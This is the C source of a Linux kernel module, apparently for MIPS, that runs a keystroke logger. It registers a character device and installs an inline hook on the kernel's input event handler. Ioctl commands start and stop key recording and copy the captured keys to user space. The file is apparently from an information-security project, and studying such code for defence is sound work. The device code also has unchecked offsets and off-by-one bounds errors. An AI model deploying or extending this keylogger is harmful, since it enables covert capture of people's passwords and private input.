#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/module.h>
#include <linux/cdev.h>
#include <linux/fs.h>
#include <linux/device.h>
#include <linux/slab.h>
#include <linux/uaccess.h>

#include "common.h"


#define DEV_MAX_NUM 255
#define DEV_BUF_SIZE    1024

extern unsigned char key_store[256];
extern int key_store_index;
extern bool key_record_status;

extern unsigned long hook_addr;
extern unsigned char ori_opcodes[16];

// 主设备号，在初始化的时候申请
dev_t dev_num;
struct cdev * my_dev = NULL;
struct class * module_class;
char my_dev_msg_buf[DEV_BUF_SIZE] = {0};

loff_t my_dev_llseek(struct file *filp, loff_t offset, int whence)
{
    printk("%s filp = [%p], offset = [%ld], whence = [%d]\n", __func__, filp, offset, whence);
    loff_t new_pos = 0;
    switch (whence) {
        case SEEK_SET:
            new_pos = offset;
            break;
        case SEEK_CUR:
            new_pos = filp->f_pos + offset;
            break;
        case SEEK_END:
            new_pos = DEV_BUF_SIZE - 1 - offset;
            break;
    }

    if (new_pos < 0 || new_pos > DEV_BUF_SIZE)
        return -EINVAL;

    filp->f_pos = new_pos;

    return new_pos;
}

/**
 * @brief 读设备函数
 * @param filp
 * @param buf
 * @param count
 * @param offset
 * @return
 */
ssize_t my_dev_read(struct file *filp, char __user * buf, size_t count, loff_t * offset)
{
    printk("%s filp = [%p], count = [%d], offset = [%d]\n",
           __func__, filp, count, *offset);
//    return 0;
    int rc = 0;
    char * msg_buf = filp->private_data;

    // 防止越界
    if (*offset + count > DEV_BUF_SIZE) {
        count = DEV_BUF_SIZE - 1 - *offset;
    }

    if(copy_to_user(buf, msg_buf + *offset, count)) {
        rc = -EFAULT;
    } else {
        *offset += count;
        rc = count;
    }
    return rc;
}

ssize_t my_dev_write(struct file *filp, const char __user * buf, size_t count, loff_t * offset)
{
    printk("%s filp = [%p], count = [%d], offset = [%d]\n",
           __func__, filp, count, *offset);
    int rc = 0;
    char * msg_buf = filp->private_data;

    if(copy_from_user(msg_buf + *offset, buf, count)) {
        rc = -EFAULT;
    } else {
        *offset += count;
        rc = count;
    }
    return rc;
}

int my_dev_open(struct inode * node, struct file * filp)
{
    printk("%s inode = [%p], filp = [%p]\n", __func__, node, filp);
    filp->private_data = my_dev_msg_buf;
    return 0;
}

int my_dev_release(struct inode * node, struct file * filp)
{
    printk("%s inode = [%p], filp = [%p]\n", __func__, node, filp);
    filp->private_data = NULL;
    return 0;
}

/**
 * @brief 主要用这个函数和应用层通信，输出数据通过read函数获取
 * @param filp
 * @param cmd
 * @param arg
 * @return
 */
long my_dev_ioctl(struct file * filp, unsigned int cmd, unsigned long arg)
{
    int rc = 0;
    printk("%s filp = [%p], cmd = [%d], arg = [%d]\n", __func__, filp, cmd, arg);
    char *msg_buf = filp->private_data;
    if (!msg_buf) {
        rc = -EINVAL;
        goto err1;
    }

    switch(cmd) {
        case KBDDEV_IOC_GETKEYS:
        {
            memcpy(msg_buf, key_store, key_store_index+1);
            int keys_len = key_store_index + 1;
            if (copy_to_user((int *)arg, &keys_len, sizeof(int))) {
                rc = -EFAULT;
            }
            printk("%s cmd = [KBDDEV_IOC_GETKEYS] msg_buf = [%s], len = [%d]\n", __func__, msg_buf, keys_len);
        }

            break;
        case KBDDEV_IOC_CLEARKEYS:
            memset(msg_buf, 0, DEV_BUF_SIZE);
            memset(key_store, 0, 256);
            key_store_index = -1;
            printk("%s cmd = [KBDDEV_IOC_CLEARKEYS]\n", __func__);
            break;
        case KBDDEV_IOC_START_RECORD_KEYS:
            key_record_status = true;
            if (copy_to_user((int *)arg, &key_record_status, sizeof(bool))) {
                rc = -EFAULT;
            }
            printk("%s cmd = [KBDDEV_IOC_START_RECORD_KEYS] key_record_status = [%d]\n", __func__, key_record_status);
            break;
        case KBDDEV_IOC_STOP_RECORD_KEYS:
            key_record_status = false;
            if (copy_to_user((int *)arg, &key_record_status, sizeof(bool))) {
                rc = -EFAULT;
            }
            printk("%s cmd = [KBDDEV_IOC_STOP_RECORD_KEYS] key_record_status = [%d]\n", __func__, key_record_status);
            break;
        default:
            rc = -EFAULT;
            printk("%s cmd = [default]\n", __func__);
            break;
    }

    err1:
    return rc;
}

struct file_operations fops = {
        .owner = THIS_MODULE,
        .llseek = my_dev_llseek,
        .read = my_dev_read,
        .write = my_dev_write,
        .open = my_dev_open,
        .release = my_dev_release,
        .unlocked_ioctl = my_dev_ioctl,
};


static int __init mips_inline_hook_init(void)
{
    printk("%s\n", __func__);

    // 先创建一个设备，用来应用层程序和驱动模块通信
    int ret = alloc_chrdev_region(&dev_num, 0, DEV_MAX_NUM, "infosec_kbd_pro_dev");
    if (ret) {
        printk("%s alloc_chrdev_region err = [%d]\n", __func__, ret);
        goto error1;
    }

    my_dev = cdev_alloc();

    if (my_dev == NULL) {
        printk("%s cdev_alloc err", __func__);
        ret = -ENOMEM;
        goto error2;
    }

    cdev_init(my_dev, &fops);

    ret = cdev_add(my_dev, dev_num, DEV_MAX_NUM);
    if (ret) {
        printk("%s cdev_add err = [%d]\n", __func__, ret);
        goto error3;
    }

    // 自动创建设备
    module_class = class_create(THIS_MODULE, "infosec_kbd_pro_class");
    device_create(module_class, NULL, dev_num, NULL, "infosec_kbd_dev");

    install_hook_input_handle_event();

    return 0;
    error3:
    kfree(my_dev);
    error2:
    unregister_chrdev_region(dev_num, DEV_MAX_NUM);
    error1:
    return ret;
}


static void __exit mips_inline_hook_exit(void)
{
    // 卸载驱动时还原hook
    memcpy(hook_addr, ori_opcodes, 16);

    printk("%s\n", __func__);
    device_destroy(module_class, dev_num);
    class_destroy(module_class);
    kfree(my_dev);
    unregister_chrdev_region(dev_num, DEV_MAX_NUM);
}

module_init(mips_inline_hook_init)
module_exit(mips_inline_hook_exit)
MODULE_LICENSE("GPL");
